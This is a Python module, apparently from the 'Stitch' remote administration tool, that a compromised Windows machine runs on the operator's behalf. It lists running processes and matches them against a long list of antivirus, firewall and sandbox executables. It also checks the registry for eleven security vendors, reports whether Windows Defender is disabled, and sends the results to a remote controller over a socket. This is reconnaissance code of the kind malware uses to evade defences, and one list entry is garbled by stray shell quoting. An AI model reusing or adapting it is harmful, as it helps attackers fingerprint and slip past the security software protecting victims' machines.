# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

avs = [
  'a2adguard.exe',
  'a2adwizard.exe',
  'a2antidialer.exe',
  'a2cfg.exe',
  'a2cmd.exe',
  'a2free.exe',
  'a2guard.exe',
  'a2hijackfree.exe',
  'a2scan.exe',
  'a2service.exe',
  'a2start.exe',
  'a2sys.exe',
  'a2upd.exe',
  'aavgapi.exe',
  'aawservice.exe',
  'aawtray.exe',
  'ad-aware.exe',
  'ad-watch.exe',
  'alescan.exe',
  'anvir.exe',
  'ashdisp.exe',
  'ashmaisv.exe',
  'ashserv.exe',
  'ashwebsv.exe',
  'aswupdsv.exe',
  'atrack.exe',
  'avgagent.exe',
  'avgamsvr.exe',
  'avgcc.exe',
  'avgctrl.exe',
  'avgemc.exe',
  'avgnt.exe',
  'avgtcpsv.exe',
  'avguard.exe',
  'avgupsvc.exe',
  'avgw.exe',
  'avkbar.exe',
  'avk.exe',
  'avkpop.exe',
  'avkproxy.exe',
  'avkservice.exe',
  'avktray',
  'avktray.exe',
  'avkwctl',
  'avkwctl.exe',
  'avmailc.exe',
  'avp.exe',
  'avpm.exe',
  'avpmwrap.exe',
  'avsched32.exe',
  'avwebgrd.exe',
  'avwin.exe',
  'avwupsrv.exe',
  'avz.exe',
  'bdagent.exe',
  'bdmcon.exe',
  'bdnagent.exe',
  'bdss.exe',
  'bdswitch.exe',
  'blackd.exe',
  'blackice.exe',
  'blink.exe',
  'boc412.exe',
  'boc425.exe',
  'bocore.exe',
  'bootwarn.exe',
  'cavrid.exe',
  'cavtray.exe',
  'ccapp.exe',
  'ccevtmgr.exe',
  'ccimscan.exe',
  'ccproxy.exe',
  'ccpwdsvc.exe',
  'ccpxysvc.exe',
  'ccsetmgr.exe',
  'cfgwiz.exe',
  'cfp.exe',
  'clamd.exe',
  'clamservice.exe',
  'clamtray.exe',
  'cmdagent.exe',
  'cpd.exe',
  'cpf.exe',
  'csinsmnt.exe',
  'dcsuserprot.exe',
  'defensewall.exe',
  'defensewall_serv.exe',
  'defwatch.exe',
  'f-agnt95.exe',
  'fpavupdm.exe',
  'f-prot95.exe',
  'f-prot.exe',
  'fprot.exe',
  'fsaua.exe',
  'fsav32.exe',
  'f-sched.exe',
  'fsdfwd.exe',
  'fsm32.exe',
  'fsma32.exe',
  'fssm32.exe',
  'f-stopw.exe',
  'f-stopw.exe',
  'fwservice.exe',
  'fwsrv.exe',
  'iamstats.exe',
  'iao.exe',
  'icload95.exe',
  'icmon.exe',
  'idsinst.exe',
  'idslu.exe',
  'inetupd.exe',
  'irsetup.exe',
  'isafe.exe',
  'isignup.exe',
  'issvc.exe',
  'kav.exe',
  'kavss.exe',
  'kavsvc.exe',
  'klswd.exe',
  'kpf4gui.exe',
  'kpf4ss.exe',
  'livesrv.exe',
  'lpfw.exe',
  'mcagent.exe',
  'mcdetect.exe',
  'mcmnhdlr.exe',
  'mcrdsvc.exe',
  'mcshield.exe',
  'mctskshd.exe',
  'mcvsshld.exe',
  'mghtml.exe',
  'mpftray.exe',
  'msascui.exe',
  'mscifapp.exe',
  'msfwsvc.exe',
  'msgsys.exe',
  'msssrv.exe',
  'navapsvc.exe',
  'navapw32.exe',
  'navlogon.dll',
  'navstub.exe',
  'navw32.exe',
  'nisemsvr.exe',
  'nisum.exe',
  'nmain.exe',
  'noads.exe',
  'nod32krn.exe',
  'nod32kui.exe',
  'nod32ra.exe',
  'npfmntor.exe',
  'nprotect.exe',
  'nsmdtr.exe',
  'oasclnt.exe',
  'ofcdog.exe',
  'opscan.exe',
  'ossec-agent.exe',
  'outpost.exe',
  'paamsrv.exe',
  'pavfnsvr.exe',
  'pcclient.exe',
  'pccpfw.exe',
  'pccwin98.exe',
  'persfw.exe',
  'protector.exe',
  'qconsole.exe',
  'qdcsfs.exe',
  'rtvscan.exe',
  'sadblock.exe',
  'safe.exe',
  'sandboxieserver.exe',
  'savscan.exe',
  'sbiectrl.exe',
  'sbiesvc.exe',
  'sbserv.exe',
  'scfservice.exe',
  'sched.exe',
  'schedm.exe',
  'scheduler daemon.exe',
  'sdhelp.exe',
  'serv95.exe',
  'sgbhp.exe',
  'sgmain.exe',
  'slee503.exe',
  'smartfix.exe',
  'smc.exe',
  'snoopfreesvc.exe',
  'snoopfreeui.exe',
  'spbbcsvc.exe',
  'sp_rsser.exe',
  'spyblocker.exe',
  'spybotsd.exe',
  'spysweeper.exe',
  'spysweeperui.exe',
  'spywareguard.dll',
  'spywareterminatorshield.exe',
  'ssu.exe',
  'steganos5.exe',
  'stinger.exe',
  'swdoctor.exe',
  'swupdate.exe',
  'symlcsvc.exe',
  'symundo.exe',
  'symwsc.exe',
  'symwscno.exe',
  'tcguard.exe',
  'tds2-98.exe',
  'tds-3.exe',
  'teatimer.exe',
  'tgbbob.exe',
  'tgbstarter.exe',
  'tsatudt.exe',
  'umxagent.exe',
  'umxcfg.exe',
  'umxfwhlp.exe',
  'umxlu.exe',
  'umxpol.exe',
  'umxtray.exe',
  'usrprmpt.exe',
  'vetmsg9x.exe',
  'vetmsg.exe',
  'vptray.exe',
  'vsaccess.exe',
  'vsserv.exe',
  'wcantispy.exe',
  'win-bugsfix.exe',
  'winpatrol.exe',
  'winpa'"'"'rolex.exe',
  'wrsssdk.exe',
  'xcommsvr.exe',
  'xfr.exe',
  'xp-antispy.exe',
  'zegarynka.exe',
  'zlclient.exe'
]

def scan_reg(antivirus):
    reg = reg_exists('SOFTWARE\\%s' % antivirus)
    if not reg: reg = reg_exists('SYSTEM\\%s AntiVirus' % antivirus)
    if not reg: reg = reg_exists('SOFTWARE\\Wow6432Node\\%s' % antivirus)
    if not reg: reg = reg_exists('SYSTEM\\CurrentControlSet\\Services\\%s AntiVirus' % antivirus)
    if not reg: reg = reg_exists('SOFTWARE\\Microsoft\\Security Center\\Monitoring\\%sAntiVirus' % antivirus)
    if not reg: return False
    else: return True

def windefnd_scan():
    defender = reg_exists('SOFTWARE\\Microsoft\\Windows Defender')
    if not defender: defender = reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    if not defender: return False
    else: return True

def windefnd_running():
    key = False
    if reg_exists('SOFTWARE\\Policies\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
    elif reg_exists('SOFTWARE\\Microsoft\\Windows Defender'):
        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,'SOFTWARE\\Microsoft\\Windows Defender')
    if key:
        try:
            val=_winreg.QueryValueEx(key, "DisableAntiSpyware")
            if val[0] == 1:
                return "Windows Defender:\t\tDisabled\n"
            else:
                return "Windows Defender:\t\tRunning\n"
        except:
            return "Windows Defender:\t\tRunning\n"

process_list = []
av_summary = ''
process = run_command('wmic process get name, ProcessId')
process = process.split('\n')
for proc in process:
    proc = proc.strip()
    name= proc.split(' ')[0]
    if 'exe' in name:
        if name in avs:
            process_list.append(proc)

windefnd = windefnd_scan()
escan = scan_reg('eScan')
avira = scan_reg('Avira')
panda = scan_reg('Panda')
sophos = scan_reg('Sophos')
ahnlab = scan_reg('AhnLab')
mcafee = scan_reg('McAfee')
bguard = scan_reg('BullGuard')
fsecure = scan_reg('F-Secure')
symantec = scan_reg('Symantec')
bitdef = scan_reg('BitDefender')
tmicro = scan_reg('Trend Micro')

if avira: av_summary += 'Avira Antivirus:\t\tDetected\n'
if panda: av_summary += 'Panda Antivirus:\t\tDetected\n'
if mcafee: av_summary += 'McAfee Antivirus:\t\tDetected\n'
if sophos: av_summary += 'Sophos Antivirus:\t\tDetected\n'
if ahnlab: av_summary += 'AhnLab V3 Antirus:\t\tDetected\n'
if bguard: av_summary += 'BullGuard Antirus:\t\tDetected\n'
if bitdef: av_summary += 'BitDefender Antirus:\t\tDetected\n'
if fsecure: av_summary += 'F-Secure Antivirus:\t\tDetected\n'
if escan: av_summary += 'escan Micro Antivirus:\t\tDetected\n'
if symantec: av_summary += 'Symantec Antivirus:\t\tDetected\n'
if tmicro: av_summary += 'Trend Micro Antivirus:\t\tDetected\n'
if windefnd: av_summary += windefnd_running()

if (not mcafee and not sophos and not ahnlab \
    and not symantec and not avira and not panda \
    and not bitdef and not fsecure and not bguard \
    and not tmicro and not escan and not windefnd):
    av_summary += 'No AVs, HIPS and/or Third Party firewalls detected.'

send(client_socket,av_summary)
av_summary = ''

if len(process_list) > 0:
    av_summary += 'Possible AVs, HIPS and/or Third Party firewalls:\n'
    av_summary += 'Image Name:\t\t    PID:\n'
    av_summary += '===========\t\t    ====\n'
    for n in process_list:
        av_summary += n
else:
    av_summary += "No AVs, HIPS and/or Third Party firewalls detected.\n"

send(client_socket,av_summary)
